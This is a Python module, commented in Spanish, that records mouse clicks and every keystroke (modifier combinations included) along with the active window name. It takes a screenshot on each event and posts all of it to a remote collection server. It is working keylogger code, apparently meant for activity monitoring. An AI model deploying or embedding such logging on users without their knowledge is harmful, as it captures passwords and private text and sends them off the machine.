from sys import path
path.append('../../')  # Evitar problema de importación circular
from pynput import mouse
from modules import consumerServer
from utils.utils import *
from modules import screenshot as sc
from pynput import mouse, keyboard as pynput_keyboard
from time import time
import threading

# -----------------------------------------------------------------------------
# Función principal Log Mouse
# -----------------------------------------------------------------------------

# Variable global para almacenar el tiempo del último clic
last_click_time = None
click_timer = None
click_type = None

def logMouse():
    """
    Log mouse coordinates on click, double-click, right-click, and middle-click
    """
    print("[Mouse] Mouse logging started...")
    global last_click_time, click_timer, click_type

    def send_click_event(x, y, button, category):
        window_name = getActiveWindowInfo("name")
        img = sc.take_screenshot(save_image=True)  # Guardar imagen
        print(img)
        print(window_name)
        session.post(consumerServer.SERVER_ADDR, json={
            "timestamp": timestamp(),
            "user": USER,
            "category": category,
            "application": window_name,
            "event_type": "click",
            "button": str(button),
            "coordX": x, 
            "coordY": y,  
            "screenshot": img
        })

    def _on_click(x, y, button, pressed):
        global last_click_time, click_timer, click_type
        if pressed:  # Se detecta el evento solo si se hace click
            current_time = time()
            # Determinar el tipo de clic para la categoría
            if button == mouse.Button.right:
                click_type = "RightClick"
            elif button == mouse.Button.middle:
                click_type = "MiddleClick"
            else:
                click_type = "MouseClick"

            # Si hay un clic izquierdo previo y el tiempo es menor a 0.6 segundos, es un doble clic
            if button == mouse.Button.left and last_click_time and (current_time - last_click_time) < 0.6:
                if click_timer:
                    click_timer.cancel()  # Cancelar el timer del clic individual
                click_type = "DoubleMouseClick"
                send_click_event(x, y, button, category=click_type)
                last_click_time = None  # Resetear el tiempo del último clic
            else:
                # Para clic derecho y medio, enviar inmediatamente
                if button != mouse.Button.left:
                    send_click_event(x, y, button, category=click_type)
                else:
                    # Iniciar un timer para un clic izquierdo individual
                    last_click_time = current_time  # Actualizar el tiempo del último clic
                    if click_timer:
                        click_timer.cancel()
                    click_timer = threading.Timer(0.6, send_click_event, [x, y, button, click_type])
                    click_timer.start()

    # Ejecuta la función correspondiente al realizar click
    with mouse.Listener(on_click=_on_click) as listener:
        listener.join()


# -----------------------------------------------------------------------------
# Funciones Auxiliares para Log Keyboard
# -----------------------------------------------------------------------------


def get_key_str(key):
    # Condición para verificar si la tecla es una tecla de función
    if isinstance(key, pynput_keyboard.Key) and 'f' in str(key):
        return str(key).upper().replace("_", " ")  # Convertir a cadena y formatear correctamente
    elif hasattr(key, 'char') and key.char:
        return key.char  # Retornar el carácter de la tecla si existe
    elif hasattr(key, 'vk'):
        if 47 < key.vk < 58:  # valores vk para las teclas numéricas 0-9
            return str(key.vk - 48)  # Convertir el valor vk al número actual
        elif 64 < key.vk < 91:  # valores vk para las teclas de letras A-Z
            return chr(key.vk)  # Convertir el valor vk a la letra actual
    return str(key)[1:-1]  # Retornar la representación de la tecla como cadena sin los corchetes angulares


# Mapeo de caracteres de control a combinaciones de teclas
control_char_mapping = {
    chr(i): f'CTRL + {chr(i + 64)}' for i in range(1, 27)
}

def translate_control_chars(char_sequence):
    return ' '.join(control_char_mapping.get(char, char) for char in char_sequence)


# -----------------------------------------------------------------------------
# Función principal Log Keyboard
# -----------------------------------------------------------------------------

def logKeyboard():
    print("[Keyboard] Keyboard logging started...")
    pressed_keys = []
    last_key_time = time()
    timer = None

    def send_data():
        nonlocal pressed_keys
        if pressed_keys:
            window_name = getActiveWindowInfo("name")
            typed_word = ''.join([k for k in pressed_keys if k])  # Filtrar cualquier valor None

            # Verificar si 'C T R L + ' ya está en typed_word
            if 'C T R L   +   ' not in typed_word:
                if any(c in control_char_mapping for c in typed_word):
                    typed_word = translate_control_chars(typed_word)  # Traducir caracteres de control solo si es necesario

            # Corregir la secuencia incorrecta
            incorrect_sequence = 'C T R L   +   '
            if typed_word.startswith(incorrect_sequence):
                typed_word = typed_word[len(incorrect_sequence):]  # Eliminar la secuencia incorrecta

            img = sc.take_screenshot(save_image=True)
            print(f"{timestamp()} {USER} {window_name} typed: {typed_word}")
            session.post(consumerServer.SERVER_ADDR, json={
                "timestamp": timestamp(),
                "user": USER,
                "category": "Keyboard",
                "application": window_name,
                "event_type": "keypress",
                "typed_word": typed_word,
                "screenshot": img
            })
            pressed_keys = []  # Limpiar pressed_keys


    modifier_state = {'alt': False, 'ctrl': False, 'win': False}  # Variables de estado de teclas

    def on_press(key):
        nonlocal last_key_time, pressed_keys, timer
        # Verificar las teclas modificadoras
        if key in {pynput_keyboard.Key.alt_l, pynput_keyboard.Key.alt_r}:
            modifier_state['alt'] = True
        elif key in {pynput_keyboard.Key.ctrl_l, pynput_keyboard.Key.ctrl_r}:
            modifier_state['ctrl'] = True
        elif key in {pynput_keyboard.Key.cmd_l, pynput_keyboard.Key.cmd_r}: 
            modifier_state['win'] = True
        else:
            key_char = get_key_str(key)
            
            # Detectar si se presiona AltGr (Ctrl + Alt)
            alt_gr_pressed = modifier_state['ctrl'] and modifier_state['alt']

            # Para Ctrl + Alt + Letra, registrar la combinación
            if alt_gr_pressed and key_char.isalpha():
                hotkey_str = 'CTRL + ALT + ' + key_char
                pressed_keys.append(hotkey_str)
            # Para AltGr + número (u otros caracteres), registrar solo el carácter resultante
            elif alt_gr_pressed and not key_char.isalpha():
                if hasattr(key, 'char'):
                    pressed_keys.append(key.char)
            elif modifier_state['ctrl'] or modifier_state['alt'] or modifier_state['win']:
                # Para otras combinaciones, construir y registrar la combinación
                hotkey_str = ''
                if modifier_state['ctrl']:
                    hotkey_str += 'CTRL + '
                if modifier_state['alt']:
                    hotkey_str += 'ALT + '
                if modifier_state['win']:
                    hotkey_str += 'WIN + '

                hotkey_str += key_char
                pressed_keys.append(hotkey_str)
            else:
                # Registrar solo la tecla presionada
                pressed_keys.append(key_char)

            # Enviar datos en caso positivo
            last_key_time = time()
            if timer is not None:
                timer.cancel()
            timer = threading.Timer(2, send_data)
            timer.start()

    def on_release(key):
        # Actualizar el estado de las teclas modificadoras cuando se sueltan
        if key in {pynput_keyboard.Key.alt_l, pynput_keyboard.Key.alt_r}:
            modifier_state['alt'] = False
        elif key in {pynput_keyboard.Key.ctrl_l, pynput_keyboard.Key.ctrl_r}:
            modifier_state['ctrl'] = False
        elif key in {pynput_keyboard.Key.cmd_l, pynput_keyboard.Key.cmd_r}: 
            modifier_state['win'] = False

    # Ejecuta la función correspondiente al pulsar una tecla
    with pynput_keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()




